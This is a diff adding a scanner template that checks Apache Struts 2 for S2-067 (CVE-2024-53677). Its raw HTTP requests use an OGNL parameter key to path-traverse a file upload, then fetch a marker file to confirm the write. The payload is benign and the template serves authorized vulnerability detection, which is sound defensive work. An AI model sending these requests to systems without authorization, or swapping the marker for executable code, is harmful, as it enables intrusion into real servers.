@@ -1,0 +1,46 @@
+id: local-struts2-s2-067-upload-traversal
+
+info:
+  name: Struts2 S2-067 File Upload Path Traversal (CVE-2024-53677)
+  author: pentest-platform
+  severity: critical
+  description: |
+    Apache Struts 2 S2-067 (CVE-2024-53677) file upload path traversal via OGNL expression in parameter key.
+    Uses "top.fileFileName" OGNL expression key to override upload filename with path traversal,
+    uploads marker file outside restricted upload/ directory, then verifies via GET.
+  reference:
+    - https://cwiki.apache.org/confluence/display/WW/s2-067
+    - https://nvd.nist.gov/vuln/detail/CVE-2024-53677
+  tags: safe-poc,exploit,struts2,s2-067,cve,cve2024,file-upload,path-traversal,ognl
+
+http:
+  - raw:
+      - |
+        POST /index.action HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=s2067boundary
+
+        --s2067boundary
+        Content-Disposition: form-data; name="file"; filename="s2067rce.txt"
+        Content-Type: text/plain
+
+        pentest-platform-s2067-rce
+        --s2067boundary
+        Content-Disposition: form-data; name="top.fileFileName"
+
+        ../s2067rce.txt
+        --s2067boundary--
+
+      - |
+        GET /s2067rce.txt HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "pentest-platform-s2067-rce"
+      - type: status
+        status:
+          - 200
